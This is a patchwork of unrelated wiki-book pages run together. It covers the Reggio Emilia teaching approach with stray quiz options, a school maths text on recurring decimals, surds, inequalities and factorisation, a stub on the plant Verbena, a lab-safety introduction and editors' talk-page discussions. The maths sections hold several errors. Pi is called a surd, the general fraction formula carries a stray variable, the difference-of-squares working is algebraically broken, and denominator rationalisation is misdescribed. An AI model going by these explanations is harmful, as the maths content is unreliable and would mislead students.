This is the key difference that sets the Reggio approach apart from other educational practices, the child is not only the focus of the educational process, but guides his own development. Even very young children are seen as capable of constructing their own learning and negotiating with everything their environment brings to them, strongly influenced by the natural, dynamic, self-righting forces within themselves (Edwards, 2003). It is important that children make and correct their own errors, for this enables a child to become skilled at problem solving from a young age. Children are viewed as active authors in their own development, full of life, power and confidence rather than full of need (Morrison, 2000). Learning involves purposeful progression, but not focused instruction in individual subject areas.  Teaching and learning are negotiated, developing processes between adults and children, involving generous time and in depth revisiting and reviewing. This aspect brings about two features of the Reggio approach that are both unique and essential to the process: the role of the teachers and their relationship with each other and parents.

=='''Teacher’s Role'''== 
	The image of the child, painted above, as one that is full of potential, curiosity, and interest in constructing their own learning, is one that necessitates a teacher whose goal is not to educate the child, but to cultivate and guide the intellectual, emotional, social and moral potentials inherent in each child. Teachers are gatherers of information about children in order to build a more complete picture of them.  Based on detailed, systematic observation, the teacher seeks to provide an atmosphere of productive calm as the students move along in their learning (Edwards, 2003). The use of continual documentation as a standard classroom practice is a process unique to the Reggio approach. Not only do teachers observe, take notes, and record conversations between children, but they also keep extensive records of children’s work to understand each child’s individual development. Journals, transcriptions, tape recordings, photographs, and representations of the children’s thinking and learning document the educational progress (Finegan, 2001). Other machines essential for documenting children’s ideas, activities, and representations include slide projectors, typewriters, video cameras, computers and photocopiers (Grieshaber &amp; Hatch, 2003).  These resources are for the benefit of the parents, the teachers, and the children themselves. Through the process of re-reading, reflection, and revisiting, children are able to organize what they have learned from a single experience within a broader system of relations. The teachers can use the gathered information for their own professional development, as well. The learning process in the Reggio classroom is a two way street; because of the nature of the approach, documentation and evaluation allows educators to construct theories and hypothesis in regards to how children develop ideas and understandings (Edwards, 2003). Documentation can also be used for instructional accountability, to piece together the learning that has occurred over time (Grieshaber &amp; Hatch, 2003). Rigorous documentation and the time it takes to evaluate this information are essential to the process. Time is a concept that is important to the Reggio approach; children and teachers alike are given all the time they need to complete necessary tasks. Because children work at their own pace and are able to start and finish projects at their leisure, the school day has a sequence, not a schedule (Finegan, 2003).  Documentation, rather than graded work, allows parents and educators to see the progress of each individual student.    

=='''Collaboration and Communication'''==
	From its very conception, the Reggio Emilia system has been a collaborative process between teachers, parents, and children. Through the process of rigorous documentation described above, teachers are able to communicate with each other and parents concerning the development of each individual child.  Children too, work with one another to learn and grow together. In Italy, teachers, parents, and other members of the Reggio Emilia community form a “consiglistione,” or council which presents an opportunity to discuss objectives, topics, and concerns resulting in the development of school policy (Finegan, 2003).  Another function of the council is to observe societal events that are important to the community and consider how these events might affect the children’s learning. Such events include: wars, elections, holidays, or any other social circumstance that has an impact on the lives of the people in the community. Documentation facilitates communication between teachers and with parents as well. This team aspect is practical in day to day operations as well. Everything is discussed and organized with precision and care including teacher’s schedules, meetings with families and children’s diets. One useful communication tool is personal journals that travel back and forth between home and school (Wilford, 2005). Teachers place photographs and other information in the journal and parents respond. This allows for both communication and developmental assessment.  Teachers collaborate with one another as well; they meet to discuss what they have recorded and make flexible plans and preparations for further development. This collaboration and cooperation is the backbone of the Reggio Emilia system and involves sharing information, questioning, and trusting each other ( Morrison, 2000). This process allows both children and adults the opportunity to value each other as people and this is one of the most important aspects of education (Wilford, 2005). Collaboration is encouraged among Reggio children from an early age. In addition to on going projects, children engage in many other forms of activity and play, including pretend play, singing, group games, storytelling, reading, cooking, outdoor play, rest, and sociable meals together ( Edwards, 2003).  They become a part of a close-knit group with their own unique rituals and ways of expressing friendship and affection for one another. Because children and teachers usually stay together in the same group for 3 years, close and extended relationships are formed with teachers and parents as well. This relationship allows for the formation of a strong link for the child between home and school and helps facilitate the developmental process.

b)	Instructor of Curriculum

c)	Child Observer

d)	Child Research Coordinator

==Potential Answer to Essay Question==

	Because of the nature of the school and its extensive network of parents, teachers, and other educators that are in constant communication about every aspect of the children development. Even though I am new to the school, I am aware the most of the parents and teachers have been here for years and are more than familiar with this process. I shouldn’t be anxious because the teachers and parents at this school are here engaged in the educational process together and all have a common goal: the social, emotional, intellectual, and moral development of each individual child. The parents, teachers and students have, in the past, met and established a plan for this time of year. The council will meet again this year to include me in this discussion and explore any ideas I might contribute. The “holiday season” is approached with honesty and open to discussion and exploration.  This is a learning opportunity for students, and unlike in a lot of public school, parents will not get distressed about their children learning about different religions and cultures.  This also allows children to grow up culturally and socially aware that people are different, and even though someone may not share the same belief system, they are still good people. Children are allowed to ask questions and explore different aspects of the various religious and secular celebrations of the holiday season. The school respects the faith of the diverse population and honors their practices with a holiday party that incorporates themes from all cultures.

==Operations on fractions and decimals==

==Converting between fractions, decimals and percentages==

===Converting recurring decimals to fractions===

So, you're in an exam and the test paper gives you a recurring decimal, say 2.35555..., and asks you to convert it into a fraction. Well, that's easy, it's just 2.3 plus 5 9ths divided by 10. simple enough. But then you get another question asking you to convert 5.676767... into a fraction. What fraction makes the repeating 0.676767...? Ahh, now you're stuck.

That's what would have happened if you hadn't learnt how to convert recurring decimals into fractions algebraically before sitting for your exam. What use does converting recurring decimals into fractions have? Can't calculators convert between decimal and fraction easily? Yes they can. This topic is probably most useful in getting you to think like a mathematician, applying maths (in this case algebra) to problems. There isn't much more use for this, other than providing an endless source of questions to test your basic algebra.

So let's start off with our recurring decimal number 5.676767... We are going to assign that value to ''x'', so '''x = 5.676767...''. Now we have something to work with. To convert it into a fraction, we need to get rid of all those annoying decimal places. To get rid of them we are going to need to multiply ''x'' by 100 to give us ''100x = 567.676767...'', and then we can subtract ''x'', or 5.676767..., from that.

&lt;math&gt;x = 5. \dot 6 \dot 7&lt;/math&gt;

&lt;math&gt;100x = 567. \dot 6 \dot 7&lt;/math&gt;

&lt;math&gt;100x - x = 567. \dot 6 \dot 7 - 5. \dot 6 \dot 7&lt;/math&gt;

&lt;math&gt;99x = 562 \;&lt;/math&gt;

&lt;math&gt;x = \frac{562}{99}&lt;/math&gt;

&lt;math&gt;x = 5  \frac{67}{99}&lt;/math&gt;

And there you go. This is the method of removing the first period

When looking at problems with recurring decimals, you need to see how many numbers are in the repeating part. In this example, the start of the repeating part was 0.67, and there were 2 numbers in each repeat. Because there were two numbers in the repeating part being repeated, we had to move the number 2 places to the left, by multiplying the number by 100, or 10&lt;sup&gt;2&lt;/sup&gt;. If you have a number with a non-repeating part ''a'' and the start of the repeating part ''r'', and a repeating length, or period, ''P'', then we can write a general list of equations for converting the recurring decimal number into a fraction.

&lt;math&gt;x = a + \dot r&lt;/math&gt;

where the dotted ''r'' is the repeating part of the equation that we are going to get rid of.

&lt;math&gt;10^Px = 10^Pa + 10^Pr + \dot r&lt;/math&gt;

where ''10&lt;sup&gt;P&lt;/sup&gt;r'' is the start of the repeating part, shifted P places to the left.

&lt;math&gt;10^Px - x = 10^Pa + 10^Pr + \dot r - a - \dot r&lt;/math&gt;

Now we subtract one equation from the other to get rid of the repeating part by making it subtract from itself, leaving just the first period of the repeating part which we shifted left ''P'' places.

&lt;math&gt;(10^P-1)x = (10^P-1)a + 10^Pr \;&lt;/math&gt;

Factorize both sides

&lt;math&gt;x = \frac{(10^P-1)a + 10^Pr}{(10^P-1)x}&lt;/math&gt;

make x the subject

If the non-repeating number ''a'' had a decimal part, like in the number 2.35555..., where ''a'' was 2.3, then the numerator would be a decimal (but not a recurring decimal) and you would have to multiply the numerator and denominator by a power of ten to make both numbers integers, and then you would have to simplify it. Calculators make this easy with their fraction buttons which can convert divisions into their simplest fractions. You could make an even more general formula if you let ''D'', for decimal, equal the amount of decimal places that the non-repeating part has. Then you can just multiply the numerator and denominator in your final answer by 10&lt;sup&gt;D&lt;/sup&gt;.

&lt;math&gt;x = \frac{[(10^P-1)a + 10^Pr] \times 10^D}{(10^P-1)x \times 10^D}&lt;/math&gt;

It is really more important that you remember the basic method and idea behind it, cancelling out the repeating part by subtracting it from itself. This formula is just for fun.

An interesting thing here is that the numerator will be equal to the non-repeating number with its decimal place removed with the repeating part of the number on the end, minus the non-repeating number with its decimal place removed without the repeating part on the end. So for 2.3555..., ''a'' = 2.3, ''r'' = 0.05, ''P'' = 1, ''D'' = 1. This makes the numerator (10×2.3 - 2.3 + 0.5)×10, so 235 - 23. 235 is ''a'' with no decimals and with ''r'' on the end, and then you are just subtracting ''a'' without decimals from that. Another thing to notice is that for every recurring number in the recurring part of the decimal, there will be a 9 in the denominator. ''10&lt;sup&gt;P&lt;/sup&gt; - 1'' is a 1 followed by zeros when ''P'' is greater than 1. So when you take one away, all you are left with is nines. 100 - 1 = 99, 1000 - 1 = 999, etc. Also, for every decimal place in the non-repeating part, there will be a zero on the end of the denominator, caused by the multiplication of 10&lt;sup&gt;D&lt;/sup&gt;.

This is where the general algorithm of subtracting the non-repeating plus start of repeating as an integer from the non-repeating as integer to get the numerator, and then adding nines for every repeating decimal number and zeros for every non-repeating decimal number comes from.

==Powers and roots==

==Scientific notation and approximation==

significant figures

Rules:

1. All non-zero digits are significant.
2. In a number without a decimal point, only zeros BETWEEN non-zero digits are significant.
3. In a number with a decimal point, all zeros to the right of the first non-zero digit are significant.

For example:
1. 1500 has two significant figures because the two zeros after 15 do not count.
If the question asks to round to 1 significant figure then the answer is 2000.

2. 1050 has three significant figures since the 0 between 1 and 5 counts. 
If the question asks to round to 2 significant figures then the answer is 1100.

3. 0.001500 has four significant figures because the 3 zeros on the left hand side of the 1 do not count. However, the 2 zeros on the right hand side of 5 '''DO''' count, thus there are four significant figures. 
If the question asks to round to 1 significant figure then the answer is 0.002.

==Evaluation of expressions involving all this stuff==
If The N+1 Number Of S.f More Than 5 We Add 1+ To N Number ,
If It Is Less Than 5 nothing is change

== Surds ==

A '''surd''' is any irrational expression, i.e. it cannot be expressed rationally (as a fraction of two integers). Common examples include &amp;radic;2 and &lt;math&gt;\pi&lt;/math&gt;. These numbers have no known patterns in their digits, and so cannot be expressed as the fraction of two integers, they can only be expressed as a decimal with the decimal places continuing on forever. Because of this, surds can only ever be evaluated as approximations to a number of decimal places.
The word 'surd' actually comes from the Arabic ''surdus'' which means root. The Arab mathematicians saw numbers like plants, growing out of their roots.

===Like and Unlike surds===
Basically, two surds are like if they have the same number under the radical, which is called the radicand. For example, &lt;math&gt;3\sqrt{3}&lt;/math&gt; and &lt;math&gt;8\sqrt{3}&lt;/math&gt; are like surds.
Unlike surds do not have the same radicand, and hence, for example, &lt;math&gt;3\sqrt{37}&lt;/math&gt; and &lt;math&gt;3\sqrt{43}&lt;/math&gt; are unlike.

===Simplifying surds===
Some surds can be simplified as a product of a rational number and a surd. For example, 

&lt;math&gt;\sqrt{45}&lt;/math&gt; can be simplified to &lt;math&gt;3\sqrt{5}&lt;/math&gt;

This happens when the number within the surd is expressed as a product of two numbers, one of them  being a perfect square:

&lt;math&gt;\sqrt{45}&lt;/math&gt;
&lt;math&gt;= \sqrt{9\times5}&lt;/math&gt;

Using the law of surds, this surd can be expressed as a product of two different, separate surds:

&lt;math&gt;\sqrt{9}\times\sqrt{5}&lt;/math&gt;

We can then evaluate &lt;math&gt;\sqrt{9}&lt;/math&gt; as &lt;math&gt;3&lt;/math&gt;:

&lt;math&gt;3\times\sqrt{5}&lt;/math&gt;
&lt;math&gt;= \sqrt{9\times5}&lt;/math&gt;

This method of simplification can also be applied to roots of any power.

===Addition and subtraction of surds===
:: &lt;math&gt;a\sqrt b \pm c\sqrt b = \left( {a \pm c} \right)\sqrt b&lt;/math&gt;

===Multiplication of surds===
:: &lt;math&gt; \sqrt a \times \sqrt b = \sqrt {ab}&lt;/math&gt;

===Division of surds===
One surd (root) divided by another surd (root) is equal to the root of the fraction of the two radicands. 
===Distributive law and surds===

===Rationalizing the denominator===
The correct form of writing a fraction requires that the denominator be rational, and hence, not a surd. To rationalise the denominator, we multiply both numerator and denominator by the denominator, resulting in a rational denominator.

== Inequalities and absolute values ==

=== Inequations ===

Inequations are mathematical statements that don't use the equals sign to express relationships between the two sides of the statement, but instead use signs such as greater than, greater than or equal to, less than, and less than or equal to.

{|border=&quot;1&quot;
|greater than || &lt;math&gt; &gt; \ &lt;/math&gt;
|-
|greater than or equal to || &lt;math&gt; \ge &lt;/math&gt;
|-
|less than || &lt;math&gt; &lt; \ &lt;/math&gt;
|-
|less than or equal to || &lt;math&gt; \le &lt;/math&gt;
|}

While equations give exact values for pronumerals, such as ''x = 2'', where ''x'' is exactly 2, inequations give a range of values which the pronumeral can have, such as ''x &gt; 2'', where ''x'' can posses any value greater than 2.

Just like when dealing with equations, adding or subtracting an amount to both sides doesn't change the inequation. If ''y + 2 &gt; 1'' then by subtracting 2 from both sides ''y &gt; -1''.

When multiplying or dividing both sides by  positive number it also works the same as an equation, for example if &lt;math&gt; 8x \ge 4 &lt;/math&gt; then by dividing both sides by 8 you get &lt;math&gt; x \ge \begin{matrix} \frac{1}{2} \end{matrix}  &lt;/math&gt;.

When multiplying or dividing both sides of an inequation by a negative number the sign reverses. for example if you have &lt;math&gt; -2x \le 3 &lt;/math&gt; and you divide both sides by -2, the less than or equal sign changes to a greater than or equal sign as &lt;math&gt; x \ge -1 \begin{matrix} \frac{1}{2} \end{matrix}  &lt;/math&gt;. This is because if one number &lt;math&gt;a\ &lt;/math&gt; is greater than another number &lt;math&gt;b\ &lt;/math&gt;, i.e. &lt;math&gt;a &gt; b \ &lt;/math&gt;, then on a number line &lt;math&gt;a\ &lt;/math&gt; is further away from 0 in the positive direction (right) than &lt;math&gt;b&lt;/math&gt;. But if you multiply the two numbers by -1, they both move to the left of the number line. Both numbers are still the same distance from 0, but because they are on the negative side of 0 &lt;math&gt;a\ &lt;/math&gt; is now more negative than &lt;math&gt;b \ &lt;/math&gt;, and so &lt;math&gt;a&lt;b \ &lt;/math&gt;. This applies to any two numbers, positive or negative.

=== Absolute Values ===

What are absolute values? Lets say you have a number ''x'', and you put it on a number line. The value of x is the value that it has on the number line, lets say -3. The absolute value of ''x'', expressed in mathematics as ''|x|'', is the distance of x from 0. Because distance cannot be negative, ''|x|'' is always greater than or equal to 0. This means that if ''x = -3'' then ''|x|'' would be 3, because the distance of -3 from 0 is 3. So if ''x'' is greater than or equal to 0, ''|x|'' will just be its normal value ''x''. But if ''x'' is less than 0, then ''|x|'' will be its negative value (the negative of a negative number), and so will be positive. This can be expressed as

&lt;math&gt; | x \vert = \begin{cases} x, &amp; x \ge 0 \\ -x, &amp; x&lt;0 \end{cases} &lt;/math&gt;

where ''|x|'' is the absolute value of ''x''.

&lt;math&gt;|ab| = |a| . |b|&lt;/math&gt;

&lt;math&gt;|a + b| \le |a| + |b|&lt;/math&gt;


==Algebraic manipulation==

===Simplification===

Removing grouping symbols and collecting like terms...

===Substitution===

Evaluating expressions using giving values and formulas. Usually requires you to make something the subject first.

===Factorization===

distributive law?

====Common factor====

====Difference of two squares====

''x&lt;sup&gt;2&lt;/sup&gt; - y&lt;sup&gt;2&lt;/sup&gt;''. This can be factorized. Can you guess how? It's probably a good idea to add some maths in here instead of just giving you the formula, so lets look at the geometrical interpretation of this. Both pronumerals are squared. The terms squared and cubed come from the formula for area of a square and volume of a cube. The area of a square is equal to the length of one side multiplied by the length of another, and because the sides of a square are all equal, the area is the length of one side multiplied by itself, so it is raised to the power of 2, or squared =). 

So if you have one squared number subtracted from another squared number, you could interpret this as one area of a square being subtracted from another area of another square. One square has side length ''x'', while the other square has side length ''y''. Does it matter which square is larger? Not really, if the area being subtracted is larger, you will end up with a negative area, and even though area, like distance, cannot be negative, we are not talking about real area, and ''x&lt;sup&gt;2&lt;/sup&gt; - y&lt;sup&gt;2&lt;/sup&gt;'' is allowed to be negative because it is an algebraic expression. If you don't like that, then think of it this way ''x&lt;sup&gt;2&lt;/sup&gt; - y&lt;sup&gt;2&lt;/sup&gt; = -(y&lt;sup&gt;2&lt;/sup&gt; - x&lt;sup&gt;2&lt;/sup&gt;)'', so if y is larger than x, then just subtract the area of the ''x'' square from the area of the ''y'' square to get a positive area, then make that negative.  

So, think about this in terms of a larger square with sides ''x'' having a smaller square with sides ''y'' subtracted from it. Subtracting a square from a square is going to leave a square shaped hole in the larger square, lets say in the corner. Now what used to be the larger square is going to have 6 edges. The two edges that were not cut will still have a length ''x''. The other two sides of the original square are going to have a length of ''x-y'', and the two inner edges created by the hole are going to have a length ''y''. From this we can calculate the remaining area. There are two rectangles, each with area ''(x-y)×y'', and one square with area ''(x-y)(x-y)''. If we expand and simplify these we get ''2xy - 2y&lt;sup&gt;2&lt;/sup&gt; + x&lt;sup&gt;2&lt;/sup&gt; - 2xy + y&lt;sup&gt;2&lt;/sup&gt;'', which can be written as ''y&lt;sup&gt;2&lt;/sup&gt; + 2xy + x&lt;sup&gt;2&lt;/sup&gt; - 2xy'', which factorizes to ''y(y+2x) + x(x-2y)'', then ''y(x+y) - xy - x(x-y) + xy'', which can be further factorizes to ''(x-y)(x+y)'' simplifies to ''x&lt;sup&gt;2&lt;/sup&gt;-y&lt;sup&gt;2&lt;/sup&gt;''. So

&lt;math&gt;x^2 - y^2 = (x+y)(x-y) \;&lt;/math&gt;

You could try the same thing with ''x&lt;sup&gt;2&lt;/sup&gt;+y&lt;sup&gt;2&lt;/sup&gt;'', but it doesn't get you anything really useful, just a(a-b) + b(a+b).

Another way to looks at this kind of factorisation problem, especially if there aren't any geometrical methods to factorize it, is to look for an expression that looks similar, but gives slightly different results, and then figure out what needs to be done in order to get from that expression to the first.e.g.

&lt;math&gt;(x+y)^2 = x^2 + 2xy + y^2&lt;/math&gt;

&lt;math&gt;x^2 - y^2 = x^2 +2xy + y^2 + a&lt;/math&gt;

&lt;math&gt;a = x^2 - y^2 - (x^2 +2xy + y^2)&lt;/math&gt;

&lt;math&gt;a = - 2xy - 2y^2&lt;/math&gt;

&lt;math&gt;x^2 - y^2 = x^2 +2xy + y^2 - 2xy - 2y^2&lt;/math&gt;

&lt;math&gt;x^2 - y^2 = x^2 +xy + y^2 - xy - 2y^2 + xy - xy&lt;/math&gt;

&lt;math&gt;x^2 - y^2 = x(x + y) - y(y + x)&lt;/math&gt;

&lt;math&gt;x^2 - y^2 = (x - y)(x + y)&lt;/math&gt;

A third way to look at it is to add something to both sides.

&lt;math&gt;xy - xy = 0&lt;/math&gt;

&lt;math&gt;x^2 - y^2 = x^2 - y^2&lt;/math&gt;

&lt;math&gt;x^2 - y^2 + 0 = x^2 + xy - xy - y^2&lt;/math&gt;

&lt;math&gt;x^2 - y^2  = x(x + y) - y(x + y)&lt;/math&gt;

&lt;math&gt;x^2 - y^2 = (x - y)(x + y)&lt;/math&gt;

probably went into too much detail on this. Awell.

====Quadratic trinomials====

====Grouping of terms to involve the other types of factorization====

====The sum and difference of two cubes====
a&lt;sup&gt;3&lt;/sup&gt;–b&lt;sup&gt;3&lt;/sup&gt; = (a-b) (a&lt;sup&gt;2&lt;/sup&gt;+ab+b&lt;sup&gt;2&lt;/sup&gt;)

a&lt;sup&gt;3&lt;/sup&gt;+b&lt;sup&gt;3&lt;/sup&gt; = (a+b) (a&lt;sup&gt;2&lt;/sup&gt;-ab+b&lt;sup&gt;2&lt;/sup&gt;)

===Algebraic fractions===

====Reduction====

factorizing numerator and denominator and canceling any common factors

====Multiplication and division====

====Addition and subtraction====

LCM

==Linear equations==
:: &lt;math&gt;ax + b = 0,\,a \ne 0&lt;/math&gt;

==Linear inequalities==

if both sides of an inequality are multiplied by a negative number, the direction of the inequality is reversed.

==Quadratic equations==

&lt;math&gt;ax^2 + bx + c = 0, a \ne 0 &lt;/math&gt;

solution by factorisation, completing the square, and formula.

equation 1

4t+1=19
4t +1=19 
take 1 to the other side
4t=19-1
4t=18
t=18/4
simplyfy it
divide the both numbers by 2
the answer is 9/2
this is a linear equation!

==Simultaneous equations==

===elimination===

linear

===substitution===

linear, quadratic, circular, hyperbolic?

'''''Verbena''''' ('''Verbena''' or '''Vervain''') is a genus of about 250 species of annual and perennial herbaceous plants in the Verbenaceae. The majority of the species are native to the New World from Canada south to southern Chile, but a few also native in the Old World, mainly in Europe (''V. officinalis, V. supina'').

==Description==
The leaves are usually opposite, simple, and in many species hairy, often densely so. The flowers are small, white, pink, purple or blue, with five petals, and borne in dense cymes or panicles.

The stems are square in cross section. Roots are fibrous.

==Species==
&lt;!--general discussion or bulleted list--&gt;

==Uses==
Grown for the showy flowers and generally good foliage, but some species are used as medicinal and culinary herbs.

==Maintenance==


==Propagation==
Propagated by seed, division, or summer cuttings.

==Harvesting==

      <text xml:space="preserve">==Introduction to Laboratory Safety==
Laboratory Safety is a very important aspect of science. Without it, experimentation could result in very serious injury, if not death, of course. To reduce the risks involved with experimentation, there are certain procedures that we should all follow as individuals and as a member of a group.  It is important that the correct procedures are used in various situations, when handling hazardous or biological materials, when preparing, executing or cleaning up an experiment.  It is also essential that you understand how to identify and use emergency equipment and protective gear.

This book is provided to guide you through and develop your understanding of Laboratory Safety.  It is important to take your time to understand the procedures, concepts and reasons to make your laboratory as safe as possible.

      <text xml:space="preserve">==The Move==
I took all the [[W:Local_history_glossary|Local_history_glossary]] article and made it into a wikibook here.  Seems to have made the move pretty well.  This is my first significant edit on WIkibooks so I don't know much about it.  When I began the move I was directed to the page [http://en.wikibooks.org/wiki/Wikibooks:Wikibooks_for_Wikipedians Help:Wikibooks for Wikipedians] which talks about the difference between Wikipedia and Wikibook.  I think this work is going to do a lot better here as a book then it does there as an article.  On Wikibook you can divide it into chapters and lots of cool stuff.  Do you have any ideas on how to section the new book in to chapters?  Do you think &quot;Scottish Rural Life, History Dictionary&quot; was the right choice for a name? Let me know.  [[User:Jeepday|Jeepday]] 13:31, 13 March 2007 (UTC)

==Begin Dewikify==
The page [[Wikibooks:Dewikify]] tells about going from Wikipedia to Wikibook.  I have started on it, looks like some of the pictures are going to need work to show up here.  [[User:Jeepday|Jeepday]] 13:31, 13 March 2007 (UTC)

== Proposed merger with [[How to write a research paper in History]] ==

I noticed this was moved from Wikipedia due to it being outside Wikipedia's scope (eg Wikipedia is not a dictionary). However in its current form I believe it is also outside of Wikibooks' scope as well (eg [[WB:WIW#Wikibooks_is_not_a_dictionary|Wikibooks is not a dictionary]]). One way to make this work on Wikibooks, is to make it more then just a dictionary or making it part of an existing book as a supplemental dictionary, glossary or appendix. I propose this page be merged into [[How to write a research paper in History]], since this may be useful in such a book. --&lt;span style=&quot;font: bold 10pt 'courier new', comic, sans, ms;&quot;&gt;[[User:Darklama|&lt;font color=&quot;midnightblue&quot;&gt;dark&lt;/font&gt;]][[User_talk:Darklama|&lt;font color=&quot;green&quot;&gt;lama&lt;/font&gt;]]&lt;/span&gt; 13:42, 28 May 2007 (UTC)

Oh no not again! Do you really insist? How about doing both and putting a copy on Wikitionary? You may have noticed that I am expanding individual entries so that it is more of a book and not a dictionary - should I change the name - '''A Source Book for Local History''' for instance. I have noticed that such logic does not forestall the 'Wikizealots', but please give it some thought. [[User:Rosser1954|Rosser1954]] 13:53, 28 May 2007 (UTC)

: I'm not trying to scare or discourage you. The only problem as I see it is, that it says its a dictionary in both the name of the page, what it says its intended for, how its written, and what its primary purpose is. I think this page can stay if its made more then just a dictionary and renamed, with the dictionary part being secondary, or if it is made part of an existing book. So instead of proposing that this page might need to be deleted, I'm proposed a possibly solution that could work, without having to dramatically change the format of the page.
: You could copy it to Wiktionary and move this page to be part of [[How to write a research paper in History]] if you want, but thats not the only solution. Wikibooks is a little more flexible in that regard then Wikipedia. If you want to change the name that would work too, but I think the scope would need to be changed or clarified, so that its clear that this isn't intended to be a dictionary. There are other solutions that could work as well. There are books for example that teach a language, so I think a book that teaches researchers how to understand any historical documentations that might be encountered would work too. Just something to think about. I'm not insistent on any specific solution. --&lt;span style=&quot;font: bold 10pt 'courier new', comic, sans, ms;&quot;&gt;[[User:Darklama|&lt;font color=&quot;midnightblue&quot;&gt;dark&lt;/font&gt;]][[User_talk:Darklama|&lt;font color=&quot;green&quot;&gt;lama&lt;/font&gt;]]&lt;/span&gt; 14:45, 28 May 2007 (UTC)

Thanks for that. I will mull it over. [[User:Rosser1954|Rosser1954]] 22:29, 28 May 2007 (UTC)


== A Resource book for Local History ==
Does this solve the problem? Can this still be merged as well? [[User:Rosser1954|Rosser1954]] 16:17, 31 May 2007 (UTC)

:I think it starts to solve the problem. It could still be merged, but if you don't want to, don't worry about it. Seems like the book I proposed a merger with isn't actively contributed to. I just thought the topics fit well together in the same book, but if you have something different in mind, I'm not going to push it. Maybe you could jot down some of your intentions for this book, what direction you want to go with it, etc. on this talk page. I think this book has the potential to be a useful book for history researchers.
: I do have a question about the book name. Is there a point in saying &quot;local history&quot; when the book doesn't appear to be intended to be limited to a specific region or location in the world? Would &quot;Understanding Historic Documents&quot; be a more descriptive/accurate name for this book, or am I way off on what your plans are? --&lt;span style=&quot;font: bold 10pt 'courier new', comic, sans, ms;&quot;&gt;[[User:Darklama|&lt;font color=&quot;midnightblue&quot;&gt;dark&lt;/font&gt;]][[User_talk:Darklama|&lt;font color=&quot;green&quot;&gt;lama&lt;/font&gt;]]&lt;/span&gt; 15:09, 4 June 2007 (UTC)

Local History is meant to refer to the investigation of the history of a locality or area - any locality - anywhere.

I found in my own researches that many texts had very obscure or specialised terms, personal names, dialect words, etc. that took a lot of searching to find out their meanings - some have still stumped me. It seemed worthwhile collating these as Local History research is a very popular pastime in my experience and others would find the info helpful. Primary &amp; secondary School projects would also benefit. 

I would like to encourage editors to expand each entry to give examples or background. I will do so also as I come across more info. Titles are always difficult - 'A Researchers Guide to Local History'  What do you think? [[User:Rosser1954|Rosser1954]] 22:09, 4 June 2007 (UTC)

:How about &quot;A Researchers Guide to Local Language History&quot;? P.S. the book is looking very good! [[User:Jeepday|Jeepday]] 16:40, 16 June 2007 (UTC)

or 'A Researchers Guide to Local History Terminology' [[User:Rosser1954|Rosser1954]] 20:13, 16 June 2007 (UTC)

:: I am going to remove the merge tag, the proposal seems to have lost traction with a rename as a better choice.  As for name I think either ''&quot;A Researchers Guide to Local Language History&quot;'' or ''&quot;A Researchers Guide to Local History Terminology&quot;'' works. [[User:Jeepday|Jeepday]] 18:35, 30 June 2007 (UTC)

== Chapters ==

This is getting big, I wonder if it should be broken into chapters? [[User:Jeepday|Jeepday]] 18:38, 30 June 2007 (UTC)

:I think it should and I've already gone ahead and split two parts of it off into separate pages and transincluded them for now. I think there is a need to split the words themselves into separate chapters somehow too, maybe by region or something? --&lt;span style=&quot;font: bold 10pt 'courier new', comic, sans, ms;&quot;&gt;[[User:Darklama|&lt;font color=&quot;midnightblue&quot;&gt;dark&lt;/font&gt;]][[User_talk:Darklama|&lt;font color=&quot;green&quot;&gt;lama&lt;/font&gt;]]&lt;/span&gt; 14:30, 6 September 2007 (UTC)

== [[WB:WIW]]  -- Not a Dictionary ==

I want to start out that I love this resource.  I really do!  And this is something that I need to get a copy of for some historical research (I am a bit of a history buff myself).  But this doesn't really fit the mission of Wikibooks.

I want to start out here that I don't want to force this to VfD status, as that would destroy this valuable work and discourage others from participating.... but at the same time this was the wrong place to get this started if all you wanted to do was make up a glossary of this nature.

One way out of this issue is to turn this into an appendix (perhaps a very large appendix) to a book about things you can do if you are a local history researcher.  In otherwords, rename this page to [[A Researcher's Guide to Local History/Glossary]] and start [[A Researcher's Guide to Local History]] as a new Wikibook that goes into methods and techniques of researching local histories.  This is not only acceptable, but encouraged.  If those involved with finding the definition of these words (some of them simply must be added to Wiktionary too!) could get involved with writing some real prose about researching local histories, this has the potential of being an outstanding resource and something which is desperately needed.  Both just here on Wikibooks and elsewhere.

I know this changes the scope of this project by quite a bit, but I hope you understand where it may be an issue.  Our sister project, Wiktionary, is really the place to add glossaries and other similar kinds of word lists.  Other similar lists have been moved there in the past, and have been successfully incorporated into that project.  --[[User:Robert Horning|Rob Horning]] 01:19, 12 July 2007 (UTC)

== Unused subpage? ==

G'day, [[A Researcher's Guide to Local History Terminology/Researching local history]] appears to be orphaned and a duplicate of this page. Should it be deleted, or is there something else afoot? [[User:Webaware|Webaware]]&amp;nbsp;&lt;sup&gt;[[User_talk:Webaware|talk]]&lt;/sup&gt; 01:29, 2 February 2008 (UTC)

== Rename ==

I propose this book be renamed to [[Researching Local History]]. It's clear that terminology is an important part of the book, but I think renaming it would allow the scope to grow, and even include non-Western information, such as [[Transwiki:Researching Japanese names]]. It could also have internal links to local history texts, such as, [[Tatworth Village]], which would serve as an excellent example of local history. --[[User:Thereen|Thereen]] ([[User talk:Thereen|discuss]] • [[Special:Contributions/Thereen|contribs]]) 21:09, 15 December 2011 (UTC)</text>

      <text xml:space="preserve">In my opinion, exclamation marks should not be used to emphasize how supposedly impressive or interesting a simple fact is.  Examples, which I have corrected, were:

&quot;A male lion's roar can be heard for up to five miles away!&quot; 

&quot;Lions normally walk 4 km/h (2.4 mph), but can run up to 60 km/h (35 mph). They can also leap distances of up to 12 m (36 feet)!&quot;

This is insulting and not objective.  The young age of the intended readers doesn't mean they aren't capable are judging for themselves whether the facts are, indeed, worth exclaiming over.  My advice is, don't include an exclamation mark unless you would also do so if the sentence was to be read by adults; otherwise, you are probably being condescending. --[[User:Logician|Logician]] 23:51, 22 May 2005 (UTC)
:Well, I'm not sure what it says about me but I do find those facts worth exclaming over and would use them in writing (or speaking) to an adult. I would prefer you did not judge me to be insulting to children.

== this does not make sense ==

'''Lions mostly eat other large mammals like zebra, gazelle, and wild pigs. Lions live and ''hunt in groups called &quot;prides&quot;''. The female lions do most of the hunting, the males' main duty being defending the pride. ''Lionesses will also hunt alone'', depending on the area they are in and what kind of game is available.'''

This information cancels eachother out. Fist it says that '''lions hunt in groups''' and then it says '''lionesses will also hunt alone''' I think someone needs to make up their mind.

John B. Here:  Gang, the ambiguity is more due to syntax than science...the lions hunting in groups are nearly always groups of females, however individual females will, under certain circumstances, also hunt alone.  Am going there to add a couple of clarifying adjectives to the original mix now.  Regards, [[User:John Burkitt|John Burkitt]] 16:57, 18 November 2005 (UTC)  

== Don't repeat things ==

